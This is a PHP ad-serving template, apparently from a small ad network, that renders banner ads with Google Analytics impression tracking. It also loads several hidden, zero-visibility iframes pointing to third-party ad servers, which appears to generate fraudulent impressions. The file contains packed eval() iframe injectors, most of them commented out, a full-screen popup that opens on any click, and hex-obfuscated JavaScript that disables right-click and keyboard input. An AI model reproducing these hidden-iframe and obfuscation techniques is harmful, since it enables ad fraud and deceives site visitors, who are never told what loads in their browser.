
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8" />
	<title>count</title>
	<script src="{{ asset('js/maxmedia/jquery-1.11.3.min.js') }}"></script>
<!--<NOSCRIPT> 
<META HTTP-EQUIV="Refresh" CONTENT="0;URL=http://maxcorpmedia.com/">
	<style type="text/css">
        .pagecontainer {display:none;}
    </style>
    <div class="noscriptmsg">
    You don't have javascript enabled.  Good luck with that.
    </div>
 
</NOSCRIPT>-->
</head>
<body>
<!--<script> 
if (navigator.javaEnabled() == true){

location.href= "http://maxcorpmedia.com/"
}

</script>-->
	<div class="pagecontainer">
	<?php

	define ("pais", $_SERVER['HTTP_CF_IPCOUNTRY']);
	define ("ip", $_SERVER['HTTP_CF_CONNECTING_IP']);



	function iframe ($link,$i) 
	{
		echo "<iframe width='728' height='90' id ='prueba".$i."'  src='".$link."' frameborder='0' scrolling='no' sandbox='allow-scripts'  style='visibility:hidden'></iframe>";
		//<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 9=\'3\'4=\'5\'6=\'7\'8=\'0\'a=\'b\'c=\'d-e\'f=\'g:2\'></1>',17,17,'|iframe|hidden|728|height|90|src|".$link."|frameborder|width|scrolling|no|sandbox|allow|scripts|style|visibility'.split('|'),0,{}))</script>
		
	}

 	function hiddenScript($id,$iframes)
 	{
 
//if(!isset($_COOKIE[$id]))

 //{	

 //echo "<script> document.cookie=".'"'.$id."=John Doe; expires=Thu, 18 Dec 2055 12:00:00 UTC;".'"'."; location.reload(true); alert('hola');</script>;   </script>";

		foreach ($iframes as $key => $value) {
		iframe ($value,$key);
		}
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 c=\'3\'4=\'5\'6=\'7\'8=\'9://a.b/l\'d=\'0\'e=\'f\'g=\'h-i\'j=\'k:2\'></1>',22,22,'|iframe|hidden|728|height|90|id|prueba1|src|https|tinyurl|com|width|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|oobtku4'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 h=\'f\'g=\'5\'6=\'7\'8=\'9://a.b.c/2/e/3/3.4?p=i&j=2&k=4&l=m\'n=\'0\'o=\'q\'r=\'s-t\'u=\'v:d\'></1>',32,32,'|iframe|wafra|xdirect|html|90|id|prueba0|src|http|cdn|waframedia8|com|hidden|tags|728|height|width|61741549|serverdomain|ct|ap|1303|frameborder|scrolling||no|sandbox|allow|scripts|style|visibility'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 3=\'e\'2=\'4\'5=\'o\'7=\'8://n.a/b?c=m&f=&3=0&2=0\'g=\'0\'h=\'i\'j=\'k-l\'d=\'9:6\'></1><1 3=\'e\'2=\'4\'5=\'p\'7=\'8://q.a/b?c=r&3=0&2=0&f=\'g=\'0\'h=\'i\'j=\'k-l\'d=\'9:6\'></1>',28,28,'|iframe|height|width|90|id|hidden|src|http|visibility|com|ads|key|style|728|ch|frameborder|scrolling|no|sandbox|allow|scripts|9d12bbc1343037347b2d5f3a1dd96353|n280adserv|prueba2|prueba3|n156adserv|576c23f37e72191ca2dbcf2fcc32e8e2'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1 b=\'3\'4=\'5\'6=\'7\'8=\'9://a.k\'c=\'0\'d=\'e\'f=\'g-h\'i=\'j:2\'></1>',21,21,'|iframe|hidden|728|height|90|id|prueba4|src|http|google|width|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|com'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 e=\'3\'4=\'5\'6=\'7\'8=\'9://a.b.c/d/p/f/g/\'h=\'0\'i=\'j\'k=\'l-m\'n=\'o:2\'></1>',26,26,'|iframe|hidden|728|height|90|id|prueba5|src|http|t|mdn2015x3|com|build|width|v1|script|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|77c5bc'.split('|'),0,{}))</script>";
		//echo "<script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('<1 d=\'3\'4=\'5\'6=\'7\'8=\'9://a.b/c/n/e\'f=\'0\'g=\'h\'i=\'j-k\'l=\'m:2\'></1>',24,24,'|iframe|hidden|728|height|90|id|prueba6|src|http|prpops|com|p|width|direct|frameborder|scrolling|no|sandbox|allow|scripts|style|visibility|gq5e'.split('|'),0,{}))</script>";
		//echo "<script><script>eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c]);return p}('<1 h=\'f\'g=\'5\'6=\'7\'8=\'9://a.b.c/2/e/3/3.4?p=i&j=2&k=4&l=m\'n=\'0\'o=\'q\'r=\'s-t\'u=\'v:d\'></1>',32,32,'|iframe|wafra|xdirect|html|90|id|prueba0|src|http|cdn|waframedia8|com|hidden|tags|728|height|width|61741549|serverdomain|ct|ap|1303|frameborder|scrolling||no|sandbox|allow|scripts|style|visibility'.split('|'),0,{}))></div>
//<script></script>";

//echo"<script>alert('hola');</script>";
//}
	  
  
  	//else
  	//{
	 //	unset($_COOKIE[$id]);
	 	//echo "<script>location.reload();</script>";
	  	// echo "<script> document.cookie=".'"'.$id."=John Doe; expires=Thu, 18 Dec 2055 12:00:00 UTC;".'"'."; location.reload(); </script>";
	   	//$i = 0;
	  	//echo "<script> $(document).ready(function(){ alert(".'"'.'hola'.'"'.");});</script>";
	  	//	$i++;
	 	//\Illuminate\Support\Facades\Session::put('prueba',$i);
	  	//			echo \Illuminate\Support\Facades\Session::get('prueba');
		        //iframe ('http://maetech.co/i.php?c='.pais.'&id='.$id,3);
		         //echo "document.write('<script src=".'"'.url()."/impressions/"."$id".'"'."type=".'"'.'text/javascript'.'"'."></script>"."')";    
		        //echo "<script> var parrafo = document.getElementById('prueba1');parrafo.parentNode.removeChild(parrafo);var parrafo = document.getElementById('prueba2');parrafo.parentNode.removeChild(parrafo);var parrafo = document.getElementById('prueba3');parrafo.parentNode.removeChild(parrafo); </script>";
	 //	}else{

	//}
	}

	$value = ip;
	$fecha = "maxcorp_10";
	$expire= time()+60*60*24;

	function countImpression($id,$popup,$size,$url,$iframes,$fecha,$expire)
	{

		if($popup == 'no')
		{

			echo "
			<script>
			  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
			  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
			  ga('create', 'UA-70977204-1', 'auto');".'ga('."'".'set'."'".', '."'".'page'."'".', '."'"."/imp/$id"."'".');'.'ga('."'".'send'."'".', '."'".'pageview'."'".');'."</script>\n";

			echo "<div style='position:absolute; top:0px; left: 0px'>";
			$paises = array('');
			$ids    = array('9');
			if (in_array($id,$ids)) 
			{
				switch($size) 
				{
					default: 
					$array = array('a' => 'ima11');
					$key = array_rand($array);
					$value = $array[$key];
					//$img='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'     href="http://www.liveadexchanger.com/a/display.php?r=1058858" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="300px" height="250px" ></a>';
					$img="<iframe id='a99359a4' name='a99359a4' src='http://www.elitefitnesscolina.com/readme.html' frameborder='0' scrolling='no' width='300' height='250'></iframe>";

					break;
					case '728x90':
					$array = array('a' => 'ima12');
					$key = array_rand($array);
					$value = $array[$key];
					//$img='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.' href="http://re.directrev.com/bin/d?s=S0009393" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="728px" height="90px" ></a>';
					$img="<iframe id='a99359a4' name='a99359a4' src='http://www.elitefitnesscolina.com/readme.html' frameborder='0' scrolling='no' width='300' height='250'></iframe>";
					break;

					case '160x600':
					echo "Bien =)";
					$img = "good";
					

				}
			}
			else 
			{
				switch($size) 
				{
					default: 
						$array = array('a' => 'ima1', 'b' => 'ima2', 'c' => 'ima3', 'd' => 'ima4', 'e' => 'ima5');
						$key = array_rand($array);
						$value = $array[$key]; 
						//hiddenScript($id,$iframes);
						$img='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'  href="http://re.directrev.com/bin/d?s=S0009393" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="300px" height="250px" ></a>';
						//$img='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'  href="http://www.adnetworkperformance.com/a/display.php?r=999060" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="300px" height="250px" ></a>';
						//$img="<iframe id='a99359a4' name='a99359a4' src='http://www.elitefitnesscolina.com/readme.html' frameborder='0' scrolling='no' width='300' height='250'></iframe>";
						break;
					case '728x90':
						$array = array('a' => 'ima6', 'b' => 'ima7', 'c' => 'ima8', 'd' => 'ima9', 'e' => 'ima10');
						$key = array_rand($array);
						$value = $array[$key]; 
						$img='<a onClick='.'"'."ga("."'"."send"."',"."'"."event"."',"."'"."hacer-click"."',"."'"."click"."',"."'"."impresiones"."/$id"."'".")".'"'.'  href="http://re.directrev.com/bin/d?s=S0009393" target="_blank"><img src='.'"'.url().'/campaigns/'.$value.'.jpg" width="728px" height="90px" ></a>';
				break;
				}
			}
			echo $img;
		    echo $url;
			hiddenScript($id,$iframes);
					
			echo "</div>\n";
		}else
		{
	    		echo  "var ancho = screen.width;
	    			   var alto = screen.height;
	    			   var a =0; var popup = 'width='+ancho+',height='+ alto+',scrollbars=no'; 
	    			   document.body.onclick = function(){ if(a == 0) {window.open('http://re.directrev.com/bin/d?s=S0009441','publicidad', popup); 
	    			   var capa = document.getElementsByTagName(".'"'.'body'.'"'.")[0];
	    			   var script = document.createElement(".'"'.'script'.'"'.");
	    			   var texto = document.createTextNode(".'"'.'(function(i,s,o,g,r,a,m){i['."'".'GoogleAnalyticsObject'."'".']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'."'".'script'."'".','."'".'//www.google-analytics.com/analytics.js'."'".','."'".'ga'."'".');ga('."'".'create'."'".', '."'".'UA-70977204-1'."'".', '."'".'auto'."'".');ga('."'".'set'."'".', '."'".'page'."'".', '."'"."/imp/$id"."'".');ga('."'".'send'."'".', '."'".'pageview'."'".");".'"'.'); script.appendChild(texto); capa.appendChild(script); a++; }};';
		}	
	}
	function filtrarId($id,$popup,$size,$url,$fecha,$expire)
	{
		if($id == 44 || $id == 215 || $id == 214 || $id == 70 || $id == 154 || $id == 155 || $id == 156 || $id == 164 || $id == 163 || $id == 178 || $id == 179 || $id == 205 || $id == 206)
		{
				$iframes = array('',
				'',
				'http://maetech.co/amung2.php?c='.pais.'&id='.$id.'',
				'http://n280adserv.com/ads?key=9d12bbc1343037347b2d5f3a1dd96353&ch=&width=0&height=0',
				'',
				'',
				'');
			countImpression($id,$popup,$size,$url,$iframes,$fecha,$expire);		
		}else
		{ 
			//http://www.xl415.com/apu.php?n=&zoneid=11497&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://www.xl415.com/apu.php?n=&zoneid=13323&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1 proyectos@gapp
			//http://www.reduxmediia.com/apu.php?n=&zoneid=12144&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://www.xl415.com/apu.php?n=&zoneid=12957&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://cdn.mediaessence.net/yepdigital/tags/xdirect/xdirect.html?p=70604125&serverdomain=yepdigital&ct=html&ap=1303
			//http://n280adserv.com/ads?key=9d12bbc1343037347b2d5f3a1dd96353&ch=&width=0&height=0
			//http://t.mdn2015x3.com/build/77c5bc/v1/script/
			//http://prpops.com/p/gq5e/direct
			//http://4win.co/test.php
			//http://cdn.mediaessence.net/yepdigital/tags/xdirect/xdirect.html?p=70157756&serverdomain=yepdigital&ct=html&ap=1303
			//http://www.xl415.com/apu.php?n=&zoneid=12889&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://www.xl415.com/apu.php?n=&zoneid=12956&cb=INSERT_RANDOM_NUMBER_HERE&popunder=1&direct=1
			//http://hdsports.in/mhub.html
			//http://a.adquantix.com/c/banner_s?tenant=AD&selection=12866&size=UN&skin=pop&auto_click=1&di=1
			//
			$iframes = array('http://zerocast.tv/mario.php',
				'http://n280adserv.com/ads?key=9d12bbc1343037347b2d5f3a1dd96353&ch=&width=0&height=0',
				'http://maetech.co/amung.php?c='.pais.'&id='.$id.'',
				'',
				'',
				'',
				'');
			countImpression($id,$popup,$size,$url,$iframes,$fecha,$expire);		
		}
	}
	if(!isset($size)){
		$size = null;
	filtrarId($id,$popup,$size,$url,$fecha,$expire);

	}else{

	filtrarId($id,$popup,$size,$url,$fecha,$expire);	
	}
?>
<script>
	//var _0x1f02=["\x6F\x6E\x63\x6F\x6E\x74\x65\x78\x74\x6D\x65\x6E\x75","\x6F\x6E\x6B\x65\x79\x64\x6F\x77\x6E","\x72\x65\x6D\x6F\x76\x65","\x70\x72\x75\x65\x62\x61\x30","\x70\x72\x75\x65\x62\x61\x32","\x70\x72\x75\x65\x62\x61\x33","\x70\x72\x75\x65\x62\x61\x34","\x70\x72\x75\x65\x62\x61\x35","\x70\x72\x75\x65\x62\x61\x36","\x70\x72\x75\x65\x62\x61\x37"];document[_0x1f02[0]]=function(){return false};document[_0x1f02[1]]=function(){return false};$(_0x1f02[3])[_0x1f02[2]]();$(_0x1f02[4])[_0x1f02[2]]();$(_0x1f02[5])[_0x1f02[2]]();$(_0x1f02[6])[_0x1f02[2]]();$(_0x1f02[7])[_0x1f02[2]]();$(_0x1f02[8])[_0x1f02[2]]();$(_0x1f02[9])[_0x1f02[2]]();
</script>
</div>
</body>
</html>
